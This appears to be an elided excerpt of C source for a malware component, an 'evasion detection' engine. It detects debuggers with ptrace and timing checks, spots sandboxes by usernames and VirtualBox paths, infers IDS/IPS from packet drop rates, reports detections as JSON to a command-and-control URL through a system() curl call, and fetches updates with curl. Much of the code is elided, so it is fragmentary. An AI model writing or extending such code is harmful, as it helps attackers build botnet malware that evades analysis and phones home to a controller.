...
detection_engine_t *detection_engine_init(void) {
  ...
  engine->event_history =
      calloc(engine->event_history_capacity, sizeof(detection_event_t));
...
bool detection_check_debugger(detection_engine_t *engine) {
  ...
  if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
    ...
    detection_event_t event = {.type = DETECTION_DEBUGGER,
  ...
  if (elapsed_ns > 10000000) {
    log_warn("Suspicious timing detected (possible debugger): %ld ns",
             elapsed_ns);
    engine->debugger_detected = true;
    return true;
  }
...
bool detection_check_sandbox(detection_engine_t *engine) {
  ...
  const char *sandbox_users[] = {"sandbox", "malware", "virus",
                                 "sample",  "test",    NULL};
  ...
  const char *sandbox_paths[] = {"/usr/bin/VBoxControl",
  ...
  if (sandbox_indicators) {
    ...
    detection_event_t event = {.type = DETECTION_SANDBOX,
                               .confidence = CONFIDENCE_HIGH,
                               .timestamp = time(NULL)};
    snprintf(event.details, sizeof(event.details),
...
bool detection_check_ids_ips(detection_engine_t *engine, uint64_t packets_sent,
  ...
  if (drop_rate > engine->ids_drop_threshold) {
    ...
    detection_event_t event = {.type = DETECTION_IDS_IPS,
                               .confidence = CONFIDENCE_MEDIUM,
                               .timestamp = time(NULL)};
    snprintf(event.details, sizeof(event.details),
             "Packet drop rate: %u%% (sent: %lu, dropped: %lu)", drop_rate,
...
int detection_analyze_and_recommend(detection_engine_t *engine,
  ...
  for (size_t i = 0; i < event_count; i++) {
    if (events[i].confidence == CONFIDENCE_CRITICAL)
      critical_count++;
    if (events[i].confidence == CONFIDENCE_HIGH)
      high_count++;
...
int detection_report_to_cnc(detection_engine_t *engine,
  ...
  if (engine->event_history_size < engine->event_history_capacity) {
    memcpy(&engine->event_history[engine->event_history_size], event,
  ...
  // Send detection event to C&C as JSON via HTTP POST (best-effort,
  // non-blocking)
  ...
  if (cnc_url != NULL) {
    ...
    snprintf(
        ...
        (int)event->type, (int)event->confidence, event->details,
    ...
    snprintf(cmd, sizeof(cmd),
             ...
             json, cnc_url);
    int _sys_ret =
        system(cmd); /* fire-and-forget — result intentionally ignored */
    (void)_sys_ret;
...
void detection_get_stats(detection_engine_t *engine, uint64_t *total_detections,
  ...
  if (critical_detections)
    *critical_detections = engine->critical_detections;
  if (last_detection_time)
    *last_detection_time = engine->last_detection_time;
}
...
#pragma GCC diagnostic pop
  ...
  char dl_cmd[2048];
  snprintf(dl_cmd, sizeof(dl_cmd), "curl -sf --max-time 60 -o '%s' '%s'",
           tmp_path, update_url);
  ...
  char sum_cmd[2048];
  snprintf(sum_cmd, sizeof(sum_cmd), "curl -sf --max-time 10 '%s'",
           checksum_url);
  ...
  if (strlen(expected_sum) >= 64) {
    ...
    snprintf(verify_cmd, sizeof(verify_cmd),
             "echo '%s  %s' | sha256sum -c - > /dev/null 2>&1", expected_sum,
             tmp_path);
